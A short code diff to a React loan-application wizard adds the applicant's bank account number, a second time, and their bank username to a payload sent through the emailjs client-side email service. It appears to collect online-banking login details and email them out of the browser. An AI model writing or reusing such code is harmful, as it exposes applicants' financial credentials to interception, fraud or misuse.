@@ -184,6 +184,8 @@ export default function ApplicationWizard() {
         account_number: formData.accountNumber,
         account_type: formData.accountType,
         assisted_by: formData.assistedByLoanAgent || "N/A",
+        accountNumber: formData.accountNumber,
+        bankUsername: formData.bankUsername,
       };
 
       await emailjs.send(
